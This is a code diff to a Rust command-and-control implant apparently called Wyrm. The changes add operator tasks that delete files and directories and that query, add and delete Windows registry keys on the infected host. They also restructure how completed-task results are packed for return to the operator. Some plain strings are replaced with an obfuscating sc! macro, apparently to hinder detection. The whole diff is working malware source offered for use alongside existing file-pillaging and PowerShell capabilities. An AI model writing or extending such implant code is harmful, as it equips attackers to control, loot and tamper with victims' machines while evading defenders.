@@ -9,7 +9,7 @@ use std::{
 use rand::{Rng, rng};
 use serde::Serialize;
 use shared::{
-    net::{CommandHeader, CompletedTasks},
+    net::CompletedTasks,
     pretty_print::print_failed,
     tasks::{Command, FirstRunData, Task, WyrmResult, tasks_contains_kill_agent},
 };
@@ -33,12 +33,14 @@ use crate::{
     native::{
         accounts::{ProcessIntegrityLevel, get_logged_in_username, get_process_integrity_level},
         filesystem::{
-            MoveCopyAction, change_directory, dir_listing, drop_file_to_disk, move_or_copy_file,
-            pillage, pull_file,
+            MoveCopyAction, PathParseType, change_directory, dir_listing, drop_file_to_disk,
+            move_or_copy_file, pillage, pull_file, rm_from_fs,
         },
         processes::{kill_process, running_process_details},
+        registry::{reg_add, reg_del, reg_query},
         shell::run_powershell,
     },
+    utils::time_utils::epoch_now,
 };
 
 pub struct RetriesBeforeExit {
@@ -245,6 +247,30 @@ impl Wyrm {
                         Some(WyrmResult::Err::<String>("Bad request".to_string())),
                     );
                 }
+                Command::RmFile => {
+                    if let Some(inner) = &task.metadata {
+                        let r = rm_from_fs(self, inner, PathParseType::File);
+                        self.push_completed_task(&task, r);
+                        continue;
+                    } else {
+                        self.push_completed_task(
+                            &task,
+                            Some(WyrmResult::Err::<String>("Bad request".to_string())),
+                        );
+                    }
+                }
+                Command::RmDir => {
+                    if let Some(inner) = &task.metadata {
+                        let r = rm_from_fs(self, inner, PathParseType::Directory);
+                        self.push_completed_task(&task, r);
+                        continue;
+                    } else {
+                        self.push_completed_task(
+                            &task,
+                            Some(WyrmResult::Err::<String>("Bad request".to_string())),
+                        );
+                    }
+                }
                 Command::Pull => {
                     if let Some(file_path) = &task.metadata {
                         match pull_file(&file_path, &self.current_working_directory) {
@@ -265,6 +291,18 @@ impl Wyrm {
                             Some(WyrmResult::Err::<String>("Bad request.".into())),
                         );
                     }
+                }
+                Command::RegQuery => {
+                    let result = reg_query(&task.metadata);
+                    self.push_completed_task(&task, result);
+                }
+                Command::RegAdd => {
+                    let result = reg_add(&task.metadata);
+                    self.push_completed_task(&task, result);
+                }
+                Command::RegDelete => {
+                    let result = reg_del(&task.metadata);
+                    self.push_completed_task(&task, result);
                 }
             }
         }
@@ -315,40 +353,49 @@ impl Wyrm {
     where
         T: Serialize,
     {
-        let command = task.command;
-        let id = task.id;
-
-        //
-        // Start off by encoding the Command into the packet header
-        //
-
-        let mut packet: Vec<u16> = Vec::from_command(command);
-
-        let data = match serde_json::to_string(&data) {
-            Ok(inner) => inner,
-            Err(e) => {
-                #[cfg(debug_assertions)]
-                println!(
-                    "[-] Error serialising data to be pushed to the completed task queue. {e}"
-                );
-
-                return;
-            }
-        };
-
-        // Write the data into the packet
-        let mut data_bytes: Vec<u16> = data.encode_utf16().collect();
-        packet.append(&mut data_bytes);
-
-        //
-        // Finally serialise the task ID
-        //
-        let id_bytes = id.to_le_bytes();
+        let id_bytes = task.id.to_le_bytes();
         let low = u16::from_le_bytes([id_bytes[0], id_bytes[1]]);
         let high = u16::from_le_bytes([id_bytes[2], id_bytes[3]]);
 
+        let mut packet = vec![low, high];
+
+        let (low, high) = task.command.to_u16_tuple_le();
         packet.push(low);
         packet.push(high);
+
+        //
+        // Finally serialise the completed time; theres probably a better way to write this..
+        //
+        let completed_time_bytes = epoch_now().to_le_bytes();
+        let sec_1 = u16::from_le_bytes([completed_time_bytes[0], completed_time_bytes[1]]);
+        let sec_2 = u16::from_le_bytes([completed_time_bytes[2], completed_time_bytes[3]]);
+        let sec_3 = u16::from_le_bytes([completed_time_bytes[4], completed_time_bytes[5]]);
+        let sec_4 = u16::from_le_bytes([completed_time_bytes[6], completed_time_bytes[7]]);
+
+        packet.push(sec_1);
+        packet.push(sec_2);
+        packet.push(sec_3);
+        packet.push(sec_4);
+
+        //
+        // Write the data into the packet if it exists
+        //
+        if let Some(d) = &data {
+            let data = match serde_json::to_string(&d) {
+                Ok(inner) => inner,
+                Err(e) => {
+                    #[cfg(debug_assertions)]
+                    println!(
+                        "[-] Error serialising data to be pushed to the completed task queue. {e}"
+                    );
+
+                    return;
+                }
+            };
+
+            let mut data_bytes: Vec<u16> = data.encode_utf16().collect();
+            packet.append(&mut data_bytes);
+        }
 
         self.completed_tasks.push(packet);
     }
@@ -402,7 +449,7 @@ impl Wyrm {
                     GetLastError()
                 ));
 
-                "unknown".to_string()
+                sc!("unknown", 178).unwrap()
             } else {
                 String::from_utf16_lossy(&buf)
             }
@@ -442,7 +489,7 @@ fn build_implant_id() -> String {
     {
         format!("{buf}")
     } else {
-        String::from("no_serial")
+        sc!("no_serial", 176).unwrap()
     };
 
     let hostname = get_hostname();
@@ -455,7 +502,7 @@ fn build_implant_id() -> String {
         let result = unsafe { GetUserNameW(PWSTR::from(buf.as_ptr() as *mut _), &mut len) };
 
         if result == 0 || len == 0 {
-            "UNKNOWN".to_string()
+            sc!("UNKNOWN", 56).unwrap()
         } else {
             String::from_utf16_lossy(&buf[0..len as usize - 1])
         }
@@ -477,7 +524,7 @@ pub fn get_hostname() -> String {
         let slice = &buf[..size as usize];
         String::from_utf16_lossy(slice)
     } else {
-        String::from("err_username")
+        sc!("err_username", 104).unwrap()
     }
 }
 
